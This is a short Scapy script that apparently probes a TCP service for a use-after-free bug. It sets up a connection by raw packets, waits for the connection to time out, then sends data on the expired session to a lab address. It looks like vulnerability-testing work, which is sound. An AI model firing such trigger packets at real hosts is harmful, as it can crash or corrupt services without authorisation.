# test-uaf-timer.py
from scapy.all import *
import time

src = "10.0.2.1"
dst = "10.0.2.105"
sport = 12347
dport = 8000

# 1. Establish connection
syn = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='S', seq=1000)
synack = sr1(syn, timeout=2, verbose=0)
if not synack or not synack.haslayer(TCP) or synack[TCP].flags != 'SA':
    print("No SYN-ACK received")
    exit(1)
ack = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='A', seq=1001, ack=synack[TCP].seq+1)
send(ack)
print("Connection established.")

# 2. Wait for connection to expire (adjust to your timeout)
print("Waiting for connection to expire...")
time.sleep(5)

# 3. Send data after expiry
data_pkt = IP(src=src, dst=dst)/TCP(sport=sport, dport=dport, flags='PA', seq=1001, ack=synack[TCP].seq+1)/Raw(b'UAF?')
send(data_pkt)
print("Sent data after expiry.")